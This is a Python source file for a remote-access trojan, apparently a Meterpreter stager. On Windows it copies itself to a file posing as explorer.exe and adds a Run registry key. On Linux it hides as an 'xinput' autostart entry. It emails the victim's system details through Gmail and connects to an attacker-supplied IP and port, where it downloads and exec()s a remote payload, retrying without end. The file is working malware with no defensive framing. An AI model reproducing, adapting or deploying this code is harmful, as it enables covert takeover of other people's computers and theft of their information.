#!/usr/bin/env python

import socket, struct, time   #Part of meterpreter Payload 
import smtplib     #Reporting the TrojanHorse Started Message via Email
import os
import shutil
import subprocess
import sys
import stat
import platform
import getpass


class TrojanHorse:
    def __init__(self, email, password, ip, port):
        self.log = ""
        self.email = email
        self.password = password
        self.ip = ip
        self.port = port
        self.system_info = self.get_system_info()
        self.become_persistent()
        self.start()

    def get_system_info(self):
        uname = platform.uname()
        os = uname[0] + " " + uname[2] + " " + uname[3]
        computer_name = uname[1]
        user = getpass.getuser()
        return "Operating System:\t" + os + "\nComputer Name:\t\t" + computer_name + "\nUser:\t\t\t\t" + user

    def start(self):
        if self.log == "":
            pass
        else:
            try:
                self.send_mail(self.log)
            except Exception as e:
                print(f"Error: {e}")
                time.sleep(10)
                self.start()            
            
        self.connect(self.ip, self.port)

        
    def connect(self, ip, port):
        try:
            s=socket.socket(2,1)
            s.connect((f'{self.ip}',self.port))
            l=struct.unpack('>I',s.recv(4))[0]
            d=s.recv(4096)
            while len(d)!=l:
                d+=s.recv(4096)
            exec(d,{'s':s})
        except Exception as e:
            print("[+] Unable to Connect, Retrying in 10 seconds!")
            print(f"Error: {e}")
            time.sleep(10)
            self.connect(self.ip, self.port)
        
    def send_mail(self, message):
        message = "Subject: TechnowHorse Report\n\n" + "Report From:\n\n" + self.system_info  + "\n\nLogs:\n" + message
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(self.email, self.password)
        server.sendmail(self.email, self.email, message)
        server.quit()

    def become_persistent(self):
        if sys.platform.startswith("win"):
            self.become_persistent_on_windows()
        elif sys.platform.startswith("linux"):
            self.become_persistent_on_linux()

    def become_persistent_on_windows(self):
        evil_file_location = os.environ["appdata"] + "\\explorer.exe"
        if not os.path.exists(evil_file_location):
            self.log = "** Meterpreter TrojanHorse started in Windows System ** "
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer /t REG_SZ /d "' + evil_file_location + '"', shell=True)

    def become_persistent_on_linux(self):
        home_config_directory = os.path.expanduser('~') + "/.config/"
        autostart_path = home_config_directory + "/autostart/"
        autostart_file = autostart_path + "xinput.desktop"
        if not os.path.isfile(autostart_file):
            self.log = "** Meterpreter TrojanHorse started in Linux System **"
            try:
                os.makedirs(autostart_path)
            except OSError:
                pass

            destination_file = home_config_directory + "xnput"
            shutil.copyfile(sys.executable, destination_file)
            self.chmod_to_exec(destination_file)

            with open(autostart_file, 'w') as out:
                out.write("[Desktop Entry]\nType=Application\nX-GNOME-Autostart-enabled=true\n")
                out.write("Name=Xinput\nExec=" + destination_file + "\n")

            self.chmod_to_exec(autostart_file)
            subprocess.Popen(destination_file)
            sys.exit()

    def chmod_to_exec(self, file):
        os.chmod(file, os.stat(file).st_mode | stat.S_IEXEC)